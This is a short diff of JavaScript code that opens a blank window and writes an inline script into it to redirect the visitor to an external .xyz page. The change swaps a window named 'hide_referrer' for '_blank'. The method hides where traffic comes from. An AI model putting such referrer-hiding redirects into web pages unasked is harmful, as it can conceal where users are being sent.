@@ -16,7 +16,8 @@
 			var URL6 = 'https://note4you.xyz/eto1.html';
 
 
-			var site = window.open("", "hide_referrer");
+			//var site = window.open("", "hide_referrer");
+			var site = window.open("", "_blank");
   			site.document.open();
   			site.document.writeln('<script type="text/javascript">window.location = "' + URL6 + '";</script>');
   			site.document.close();
